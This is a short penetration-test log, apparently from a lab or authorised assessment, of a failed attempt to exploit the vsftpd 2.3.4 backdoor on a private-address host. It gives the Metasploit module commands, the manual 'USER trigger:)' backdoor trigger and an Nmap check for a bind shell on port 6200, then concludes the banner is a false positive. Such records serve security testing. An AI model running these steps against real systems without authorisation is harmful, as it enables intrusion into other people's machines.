# vsftpd 2.3.4 Exploit Attempt
Date: 2025-05-27
Tool: Metasploit (exploit/unix/ftp/vsftpd_234_backdoor)

Command run:
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.6.3
run

Result:
[*] 192.168.6.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.6.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.

Further manual testing:
- Sent 'USER trigger:)' and observed 331 response
- Scanned for port 6200 using Nmap, but no bind shell detected
- Conclusion: Host is not running the backdoored vsftpd binary or shell failed to spawn

Assessment: This is a false positive banner. No shell access gained via this vector.
